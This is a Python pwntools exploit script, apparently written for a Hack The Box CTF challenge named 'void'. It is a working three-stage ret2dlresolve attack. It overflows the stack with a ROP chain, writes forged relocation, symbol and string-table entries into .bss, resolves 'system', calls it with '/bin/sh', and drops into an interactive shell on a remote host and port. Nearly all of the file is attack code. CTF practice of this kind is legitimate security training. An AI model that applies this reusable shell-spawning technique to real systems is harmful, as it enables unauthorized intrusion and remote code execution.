import dataclasses
import ipaddress
import pathlib
from loguru import logger
from pwnlib import gdb

from core.target_config import Config, Mode
from core.targetbase import TargetBase
from custom.auth_or_out import AuthOrOutPwn
from pwn import p64, u64


if __name__ == '__main__':
    remote_config = Config(
        rop=True,
        mode=Mode.remote,
        ip=ipaddress.IPv4Address('161.35.168.118'),
        port=30953,
        file=pathlib.Path('/home/lim8en1/htb/ctf/void/challenge/void'),
        offset=0x48,
        libc='libc6_2.31-13+deb11u5_amd64'
    )
    t = TargetBase(pwn_target=AuthOrOutPwn, config=remote_config)
    # _, debugger = gdb.attach(t.process.pid, api=True)
    # debugger.execute('break _dl_fixup')
    # debugger.execute('c')

    dynstr = t.file.get_section_by_name('.dynstr').header.sh_addr
    dynsym = t.file.get_section_by_name('.dynsym').header.sh_addr
    relplt = t.file.get_section_by_name('.rela.plt').header.sh_addr
    bss = t.file.get_section_by_name('.bss').header.sh_addr
    logger.info(f".dynstr@{hex(dynstr)}")
    logger.info(f".dynsym@{hex(dynsym)}")
    logger.info(f".rela.plt@{hex(relplt)}")
    logger.info(f".bss@{hex(bss)}")
    resolver = 0x401020
    main = t.file.symbols['vuln']
    read = t.file.symbols['read']

    filler = 0x18 - (((bss + 0x18) - dynsym) % 0x18)
    dynsym_offset = ((bss + 0x18 + filler) - dynsym) // 0x18
    r_info = (dynsym_offset << 32) | 0x7
    dynstr_index = (bss + 7 * 0x8 + filler) - dynstr

    second_stage = b""

    # Our .rel.plt entry
    second_stage += p64(t.file.got['read'])
    second_stage += p64(r_info)

    # Empty
    second_stage += p64(0x0)
    second_stage += b'\0' * filler

    # Our dynsm entry
    second_stage += p64(dynstr_index)
    second_stage += p64(0x0) * 3

    # Our dynstr entry
    # second_stage += b"execv\x00"
    second_stage += b"system\x00"
    binsh_bss_address = bss + len(second_stage)

    # Store "/bin/sh" here so we can have a pointer ot it
    second_stage += b"/bin/sh\x00"
    pop_rsi = t.rop.find_gadget(['pop rsi', 'pop r15',  'ret']).address
    pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address
    first_stage = t.create_payload(
        p64(pop_rsi) +
        p64(bss) +
        p64(0) +
        p64(read) +
        p64(main)
    )
    logger.info("Sending the first stage")
    t.process.send_raw(first_stage)
    logger.info("Sending the second stage")
    t.process.send_raw(second_stage)

    ret_plt_offset = (bss - relplt) // 24
    third_stage = b""

    third_stage += p64(pop_rdi)  # pop rdi gadget
    third_stage += p64(binsh_bss_address)  # our argument, address of "/bin/sh"
    # third_stage += p64(pop_rsi)  # execv payload
    # third_stage += p64(0)
    # third_stage += p64(0)
    third_stage += p64(resolver)
    third_stage += p64(ret_plt_offset)  # offset to function to resolve
    # third_stage += p64(0)  # read
    third_stage += p64(0xc001babedeadbeef)  # whatever
    logger.info("Sending the third stage")
    t.process.send_raw(t.create_payload(third_stage))
    logger.info("Shell:")

    t.process.interactive()


    """
    <_dl_fixup+33>   lea    rsi, [rax+rdx*8] - rsi - rela.plt ptr
    rbx - got.plt ptr
    rax - .dynsym
    <_dl_fixup+134>  lea    r8, [rdx+rcx*8] - r8 str table ptr
    """
